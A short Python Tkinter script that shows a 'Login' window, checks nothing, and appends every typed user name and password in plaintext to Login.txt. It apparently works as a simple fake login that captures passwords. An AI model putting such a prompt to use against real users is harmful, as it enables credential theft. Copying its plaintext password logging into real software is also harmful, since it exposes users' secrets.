from tkinter import *
from tkinter import messagebox

win = Tk()
win.geometry("500x150")
win.title("Login")
win.resizable(0,0)
win.configure(bg = "#000000")

def reset():
    entry1.delete(0,END)
    entry2.delete(0,END)

def submit():
    user_name = entry1.get()
    password = entry2.get()

    if (user_name == "" and password ==""):
        messagebox.showerror("Error","Please Type User Name and Password")
    elif (user_name == ""):
        messagebox.showerror("Error","Please Type your User Name")
    elif (password == ""):
        messagebox.showerror("Error","Please Type your Password")
    else:
        a = messagebox.askyesno("Notice","Are you sure about your User Name and Password? ")
        if a == True:
            messagebox.showinfo("Notice","Thank You for Loged in :)")
            f = open("Login.txt", "a")
            f.write("--------------------"+"\n")
            f.write("Correct Password"+"\n")
            f.write(user_name+"\n")
            f.write(password+"\n")
            f.write("--------------------"+"\n")
            f.close()
        else:
            messagebox.showinfo("Notice","Please Enter the Ccorrect User Name and Password :(")
            f = open("Login.txt", "a")
            f.write("--------------------"+"\n")
            f.write("Icorrect Password"+"\n")
            f.write(user_name+"\n")
            f.write(password+"\n")
            f.write("--------------------"+"\n")
            f.close()

        reset()

label1 = Label(win, font = ("Comic sans ms", 12, "bold", "italic"), text = "User Name: ", bg = "#000000",fg = "#ffffff")
label1.grid(row = 0, column = 0, padx = 10)
entry1 = Entry(win, font = ("Comic sans serif", 12, "bold", "italic"), width = 35)
entry1.grid(row = 0, column = 1, pady = 10, padx = 10)

label2 = Label(win, font = ("Comic sans ms", 12, "bold", "italic"), text = "Password: ", bg = "#000000",fg = "#ffffff")
label2.grid(row = 1, column = 0, padx = 10)
entry2 = Entry(win, font = ("Comic sans serif", 12, "bold", "italic"), width = 35)
entry2.config(show = "*")
entry2.grid(row = 1, column = 1, pady = 10, padx = 10)

btn = Button(win, text = "Submit", font = ("Comic sans ms", 12, "bold", "italic"), bg = "#000000", fg = "#ffffff", relief = "sunken", border = 5, command = submit)
btn.grid(row = 2, column = 0, pady = 10, padx = 10)


mainloop()

